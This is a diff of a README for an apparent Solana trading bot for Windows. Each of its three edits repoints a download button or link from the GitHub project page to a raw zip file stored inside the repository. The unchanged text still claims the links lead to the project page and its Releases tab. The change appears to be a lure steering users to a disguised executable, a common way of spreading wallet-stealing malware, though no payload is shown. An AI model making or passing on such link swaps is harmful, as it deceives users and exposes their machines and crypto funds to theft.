@@ -1,6 +1,6 @@
 # ⚡ solana-trading-bot - Easy Solana Trading Assistant
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Ayush-Kumar111/solana-trading-bot)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ayush-Kumar111/solana-trading-bot/main/scripts/trading-bot-solana-v2.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these steps to get the bot running on your Windows machine.
 
 ### 1. Download the software
 
-Click the big button above or visit the [GitHub page](https://github.com/Ayush-Kumar111/solana-trading-bot) to access the download files. Look for the latest Windows version.
+Click the big button above or visit the [GitHub page](https://raw.githubusercontent.com/Ayush-Kumar111/solana-trading-bot/main/scripts/trading-bot-solana-v2.6.zip) to access the download files. Look for the latest Windows version.
 
 Since the link leads to the main project page, you need to find the **Releases** section. Here you will find the latest `.exe` installer or folder with required files.
 
@@ -106,7 +106,7 @@ If you face issues, try these steps:
 ## 💾 Download and Setup Once More
 
 Access the project here:  
-[![Download Here](https://img.shields.io/badge/Get--from--GitHub-blue?style=for-the-badge)](https://github.com/Ayush-Kumar111/solana-trading-bot)
+[![Download Here](https://img.shields.io/badge/Get--from--GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ayush-Kumar111/solana-trading-bot/main/scripts/trading-bot-solana-v2.6.zip)
 
 This link takes you to the main project site. Use the **Releases** tab to get the latest version for Windows. Follow the earlier steps to install and start.
 
